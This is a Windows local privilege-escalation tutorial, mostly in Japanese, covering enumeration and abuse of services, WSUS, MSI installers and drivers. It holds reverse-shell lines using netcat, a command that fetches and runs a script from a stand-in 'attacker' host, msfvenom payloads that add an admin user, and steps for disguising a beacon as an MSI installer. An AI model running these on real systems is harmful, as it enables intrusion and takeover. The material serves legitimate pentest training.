# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors を探すのに最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows の基礎理論

### Access Tokens

**If you don't know what are Windows Access Tokens, read the following page before continuing:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Check the following page for more info about ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**If you don't know what are integrity levels in Windows you should read the following page before continuing:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows セキュリティ制御

Windows には、**prevent you from enumerating the system**、実行ファイルの実行を阻止したり、あなたの活動を**detect your activities**したりするさまざまな仕組みがあります。privilege escalation enumeration を開始する前に、以下の**page**を**read**し、これらすべての**defenses** **mechanisms**を**enumerate**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## システム情報

### Version info enumeration

Windows のバージョンに既知の vulnerability がないか確認してください（適用されている patches も確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### バージョンエクスプロイト

この[site](https://msrc.microsoft.com/update-guide/vulnerability)はMicrosoftのセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700件以上の脆弱性が登録されており、Windows環境が持つ**膨大な攻撃対象**を示しています。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasにはwatsonが組み込まれています)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

資格情報や重要な情報が環境変数に保存されていますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell の履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript ファイル

この機能を有効にする方法は [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) で確認できます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell のパイプライン実行の詳細は記録され、実行されたコマンド、コマンド呼び出し、スクリプトの一部が含まれます。ただし、完全な実行内容や出力結果が記録されないことがあります。

これを有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**"Module Logging"** を **"Powershell Transcription"** の代わりに選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell ログの最後の 15 件のイベントを表示するには、次を実行できます:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行におけるすべての活動とその内容が完全に記録され、各コードブロックが実行時に逐一記録されることが保証されます。このプロセスは、各活動の包括的な監査証跡を保持し、フォレンジックや悪意ある挙動の解析に有用です。実行時にすべての活動を記録することで、プロセスに関する詳細な洞察が得られます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは Windows Event Viewer のパスにあります: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
最後の20件のイベントを表示するには、次を使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http で要求されている場合、システムを侵害できます。

まず、ネットワークが non-SSL の WSUS update を使用しているかどうかを、次のコマンドを cmd で実行して確認します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
もしくは PowerShell で次のように：
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような応答が返ってきた場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
そして `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` と等しい場合。

この場合、**悪用可能です。** 最後のレジストリが `0` の場合、WSUS エントリは無視されます。

この脆弱性を悪用するためには、次のようなツールを使用できます: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - これらは非SSL WSUS トラフィックに '偽' アップデートを注入するための MiTM 化されたエクスプロイトスクリプトです。

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
基本的に、このバグが悪用する欠陥は次のとおりです：

> ローカルユーザのプロキシを変更する権限があり、Windows Updates が Internet Explorer の設定で構成されたプロキシを使用している場合、ローカルで [PyWSUS](https://github.com/GoSecure/pywsus) を実行して自分のトラフィックを傍受し、資産上で昇格したユーザとしてコードを実行することができます。
>
> さらに、WSUS サービスは現在のユーザの設定を使用するため、その証明書ストアも使用します。WSUS のホスト名に対して自己署名証明書を生成し、この証明書を現在のユーザの証明書ストアに追加すれば、HTTP および HTTPS の WSUS トラフィックの両方を傍受できます。WSUS は証明書に対して HSTS のような仕組みを使用しておらず、trust-on-first-use 型の検証を実装しています。提示された証明書がユーザによって信頼され、正しいホスト名を持っていれば、サービスはそれを受け入れます。

この脆弱性はツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) を使用して悪用できます（入手可能になれば）。

## Third-Party Auto-Updaters and Agent IPC (local privesc)

多くのエンタープライズエージェントは localhost の IPC サーフェスと特権更新チャネルを公開しています。エンロールメントが攻撃者サーバに強制され、updater が不正なルート CA や弱い署名チェックを信頼する場合、ローカルユーザは SYSTEM サービスがインストールする悪意のある MSI を配布できます。汎用的な手法（Netskope stAgentSvc チェーンに基づく – CVE-2025-0309）は次を参照してください：

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` は **TCP/9401** で localhost サービスを公開しており、攻撃者制御のメッセージを処理して **NT AUTHORITY\SYSTEM** として任意のコマンドを実行させます。

- **Recon**: リスナーとバージョンを確認する。例: `netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。
- **Exploit**: `VeeamHax.exe` のような PoC と必要な Veeam DLL を同じディレクトリに配置し、ローカルソケット経由で SYSTEM ペイロードをトリガーします：
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
サービスはコマンドを SYSTEM として実行します。
## KrbRelayUp

特定の条件下で、Windows **domain** 環境に **local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing is not enforced,**、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を設定できる自己権限を持っていること、そしてユーザーがドメイン内にコンピューターを作成できることが含まれます。これらの**要件**が**デフォルト設定**で満たされている点に注意してください。

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

攻撃のフローの詳細については [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) を参照してください。

## AlwaysInstallElevated

**If** これら2つのレジストリが **enabled**（値が **0x1**）になっている場合、任意の権限を持つユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **install**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使用して、カレントディレクトリに権限を昇格させる Windows MSI バイナリを作成します。このスクリプトは、ユーザー/グループの追加を促す事前コンパイル済みの MSI インストーラを書き出します（そのため GIU access が必要です）：
```
Write-UserAddMSI
```
作成したバイナリを実行するだけで特権昇格できます。

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Cobalt Strike** または **Metasploit** を使って、`C:\privesc\beacon.exe` に **new Windows EXE TCP payload** を**生成**します
- **Visual Studio** を開き、**Create a new project** を選択して検索ボックスに「installer」と入力します。**Setup Wizard** プロジェクトを選んで **Next** をクリックします。
- プロジェクト名を **AlwaysPrivesc** のように付け、場所に **`C:\privesc`** を使用し、**place solution and project in the same directory** を選択して **Create** をクリックします。
- **Next** を繰り返しクリックして 4 ステップ中のステップ 3（含めるファイルの選択）まで進みます。**Add** をクリックして先ほど生成した Beacon ペイロードを選択し、**Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- **Author** や **Manufacturer** のような他のプロパティも変更でき、インストールされるアプリをより正当らしく見せることができます。
- プロジェクトを右クリックして **View > Custom Actions** を選択します。
- **Install** を右クリックして **Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これによりインストーラが実行されるとすぐに beacon ペイロードが実行されるようになります。
- **Custom Action Properties** の下で **Run64Bit** を **True** に変更します。
- 最後に、**ビルド** します。
- 警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` が表示された場合は、プラットフォームを x64 に設定していることを確認してください。

### MSI Installation

To execute the **installation** of the malicious `.msi` file in **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには次を使用できます: _exploit/windows/local/always_install_elevated_

## アンチウイルスと検出

### 監査設定

これらの設定は、何が**記録される**かを決定するので、注意してください
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding は、ログがどこに送信されているかを把握しておくことは重要です
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** はドメインに参加しているコンピュータ上の **ローカル Administrator パスワードの管理** を目的としており、各パスワードが **一意でランダム化され、定期的に更新される** ようにします。これらのパスワードは Active Directory 内に安全に格納され、ACLs を通じて十分な権限が付与されたユーザのみがアクセスでき、許可されていればローカル admin パスワードを参照できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードが LSASS に保存されます** (Local Security Authority Subsystem Service)。\
[**このページの WDigest に関する詳細**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対して強化された保護を導入し、信頼されていないプロセスによる**メモリを読み取る**試みやコードの注入を**ブロック**し、システムのセキュリティをさらに強化しました。\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。これはデバイスに保存された認証情報を pass-the-hash 攻撃のような脅威から保護することを目的としています。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### キャッシュされた資格情報

**ドメイン資格情報**は**ローカル セキュリティ オーソリティ** (LSA) によって認証され、オペレーティング システムのコンポーネントによって利用されます。ユーザーのログオンデータが登録されたセキュリティパッケージによって認証されると、通常そのユーザーのドメイン資格情報が確立されます。\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

所属するグループに注目すべき権限があるか確認してください。
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

もしあなたが**特定の特権グループに所属している場合、権限を昇格できる可能性があります**。特権グループと、それらを悪用して権限を昇格させる方法については、こちらを参照してください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### トークン操作

**詳細**: このページで**token**が何かを学んでください: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
以下のページを確認して、**興味深いtokenについて学び**、それらを悪用する方法を確認してください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログオンユーザー / セッション
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワード ポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダの権限

まず、プロセスを一覧表示して、**プロセスのコマンドライン内のパスワードを確認する**。\
実行中の**binaryを上書きできるか**、またはbinaryフォルダに書き込み権限があるかを確認して、可能な[**DLL Hijacking attacks**](dll-hijacking/index.html)を悪用できないか調べる:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
必ず[**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)が実行されているか確認してください。

**プロセスバイナリの権限の確認**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリが置かれているフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

sysinternals の **procdump** を使って、実行中のプロセスのメモリダンプを作成できます。FTP のようなサービスはメモリ内に**平文の資格情報**を保持していることがあり、メモリをダンプして資格情報を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 脆弱な GUI アプリ

**SYSTEM として実行されるアプリケーションは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: "Windows Help and Support"（Windows + F1）で "command prompt" を検索し、"Click to open Command Prompt" をクリック

## サービス

Service Triggers は、特定の条件が発生したときに Windows がサービスを起動することを可能にします（named pipe/RPC endpoint activity、ETW events、IP availability、device arrival、GPO refresh など）。SERVICE_START 権限がなくても、トリガーを発動させることで特権サービスを起動できることがよくあります。列挙および起動手法は以下を参照してください:

-
{{#ref}}
service-triggers.md
{{#endref}}

サービスの一覧を取得する:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

サービスの情報を取得するには **sc** を使用できます。
```bash
sc qc <service_name>
```
各サービスに必要な特権レベルを確認するため、_Sysinternals_ のバイナリ **accesschk** を用意しておくことを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" が任意のサービスを変更できるかどうかを確認することをお勧めします:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効化

次のエラーが発生している場合（例: SSDPSRV）:

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

次のコマンドで有効にできます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost は動作するために SSDPSRV に依存することに注意してください (XP SP1 の場合)**

**別の回避策** この問題は次のコマンドを実行することで回避できます:
```
sc.exe config usosvc start= auto
```
### **サービスのバイナリパスを変更する**

サービスに対して "Authenticated users" グループが **SERVICE_ALL_ACCESS** を保持している場合、サービスの実行バイナリを変更することが可能です。サービスを変更して実行するには **sc** を使用します:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges can be escalated through various permissions:

- **SERVICE_CHANGE_CONFIG**: サービスのバイナリを再構成（再設定）できるようにします。
- **WRITE_DAC**: 権限の再構成を可能にし、サービス構成の変更につながります。
- **WRITE_OWNER**: 所有権の取得と権限の再構成を許可します。
- **GENERIC_WRITE**: サービス構成を変更する権限を含みます。
- **GENERIC_ALL**: 同様にサービス構成を変更する権限を含みます。

For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.

### Services binaries weak permissions

**サービスによって実行されるバイナリを変更できるか確認してください** or if you have **バイナリが置かれているフォルダに対する書き込み権限があるかどうか** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
サービスで実行されるすべてのバイナリは **wmic** を使って取得でき（system32内のものは除く）、**icacls** で権限を確認できます:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
また、**sc** と **icacls** も使用できます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry の変更権限

任意の service registry を変更できるか確認してください。\
次のように service **registry** に対する **permissions** を **check** できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。もしそうであれば、サービスによって実行されるバイナリを改変できます。

実行されるバイナリの Path を変更するには：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

レジストリに対してこの権限がある場合、**you can create sub registries from this one**を意味します。Windows servicesの場合、これは**enough to execute arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルのパスが引用符で囲まれていない場合、Windowsはスペースの前の各部分を順に実行しようとします。

例えば、パス _C:\Program Files\Some Folder\Service.exe_ の場合、Windowsは次の順で実行を試みます：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除き、引用符で囲まれていないサービスのパスをすべて列挙する:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性は metasploit で検出および悪用できます**: `exploit/windows/local/trusted\_service\_path` metasploit を使用して手動でサービスバイナリを作成できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 回復アクション

Windows はサービスが失敗した場合に実行されるアクションを指定できます。この機能は特定の binary を指すように設定できます。もしその binary を置き換え可能であれば、privilege escalation が発生する可能性があります。詳しくは [公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) を参照してください。

## アプリケーション

### インストール済みのアプリケーション

**permissions of the binaries**（maybe you can overwrite one and escalate privileges）および**folders**の権限を確認してください（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

設定ファイルを変更して特定のファイルを読み取れるか、あるいは Administrator アカウントで実行されるバイナリ（schedtasks）を変更できるかを確認してください。

システム内の脆弱なフォルダ/ファイルの権限を見つける方法の一つは次のとおりです:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 起動時に実行

**別のユーザーによって実行される registry または binary を上書きできるか確認してください。**\
**読む** **以下のページ** を参照して、興味深い **autoruns locations to escalate privileges** について詳しく学んでください:

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

可能性のある **サードパーティの奇妙/脆弱な** ドライバーを探してください
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
ドライバが arbitrary kernel read/write primitive を公開している場合（設計の悪い IOCTL handlers で一般的）、kernel memory から直接 SYSTEM token を盗むことで権限昇格できます。手順は以下を参照してください:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

脆弱な呼び出しが攻撃者管理下の Object Manager パスを開くような race-condition のバグでは、lookup を意図的に遅延させる（最大長のコンポーネントや深いディレクトリチェーンを使う）ことで、ウィンドウを数マイクロ秒から数十マイクロ秒にまで拡張できます:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

最新の hive 脆弱性では、決定的なレイアウトを整え、書き込み可能な HKLM/HKU の子孫を悪用し、metadata corruption をカスタムドライバなしで kernel paged-pool overflows に変換できます。全工程は以下を参照してください:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### device objects における FILE_DEVICE_SECURE_OPEN の未設定の悪用 (LPE + EDR kill)

署名された一部のサードパーティドライバは、IoCreateDeviceSecure を介して強力な SDDL で device object を作成するものの、DeviceCharacteristics に FILE_DEVICE_SECURE_OPEN を設定し忘れることがあります。このフラグがないと、デバイスが余分なコンポーネントを含むパス経由で開かれたときに secure DACL が適用されず、権限のない任意のユーザが次のような namespace パスを使ってハンドルを取得できます:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

ユーザがデバイスを開けるようになると、ドライバが公開する特権的な IOCTLs を LPE や改ざんに悪用できます。実際に観測された機能例:
